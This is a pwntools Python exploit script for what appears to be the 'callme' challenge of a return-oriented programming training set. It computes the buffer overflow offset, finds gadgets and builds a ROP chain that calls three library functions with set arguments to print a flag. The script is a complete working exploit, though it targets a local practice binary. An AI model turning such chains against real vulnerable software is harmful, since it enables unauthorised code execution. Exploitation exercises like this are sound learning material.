from pwn import *

#
# Context
#

e = context.binary = ELF('callme')
lib = ELF('libcallme.so')

#
# Offset
#

io = process(e.path)

io.sendlineafter(b'> ', cyclic(0x200))
io.wait()

core = io.corefile

io.close()
offset = cyclic_find(core.read(core.rsp, 4))
info(f'Offset: {offset}')

#
# ROP
#

# Alternative: use "ropper"
POPRDI = p64(next(e.search(asm('pop rdi; ret;'))))
POPRSI_POPRDX = p64(next(e.search(asm('pop rsi; pop rdx; ret;')))) # 0x000000000040093d

CALLME_ONE   = p64(e.plt["callme_one"])
CALLME_TWO   = p64(e.plt["callme_two"])
CALLME_THREE = p64(e.plt["callme_three"])

SET_PARAMETERS  = b''
SET_PARAMETERS += POPRDI
SET_PARAMETERS += p64(0xdeadbeefdeadbeef)
SET_PARAMETERS += POPRSI_POPRDX
SET_PARAMETERS += p64(0xcafebabecafebabe)
SET_PARAMETERS += p64(0xd00df00dd00df00d)

#
# Exploit
#

io = process(e.path)

payload =  b''
payload += b'A' * offset

payload += SET_PARAMETERS
payload += CALLME_ONE

payload += SET_PARAMETERS
payload += CALLME_TWO

payload += SET_PARAMETERS
payload += CALLME_THREE

with open("payload", "wb") as fout:
    fout.write(payload)

io.sendlineafter(b'> ', payload)

info(io.recvuntil(b'}').decode())
io.close()